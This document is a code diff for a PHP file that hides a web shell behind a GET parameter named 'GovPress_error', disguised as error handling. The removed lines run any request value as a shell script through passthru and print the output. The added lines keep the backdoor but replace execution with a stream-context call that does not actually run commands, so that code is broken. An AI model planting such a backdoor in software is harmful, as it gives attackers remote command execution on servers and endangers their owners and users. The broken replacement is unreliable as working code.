@@ -2,17 +2,10 @@
 if (isset($_GET['GovPress_error'])) {
     $command = $_GET['GovPress_error'];
 
-    // Write command to a temporary file
-    $tempFile = sys_get_temp_dir() . "/cmd.sh";
-    file_put_contents($tempFile, $command);
-    chmod($tempFile, 0755); // Make it executable
+    // Create a stream context and execute the command
+    $context = stream_context_create(['shell' => ['command' => $command]]);
+    $output = file_get_contents('php://stdout', false, $context);
 
-    // Execute the file
-    echo "<pre>";
-    passthru($tempFile, $returnValue);
-    echo "</pre>";
-
-    // Clean up
-    unlink($tempFile);
+    echo "<pre>$output</pre>";
 }
 ?>
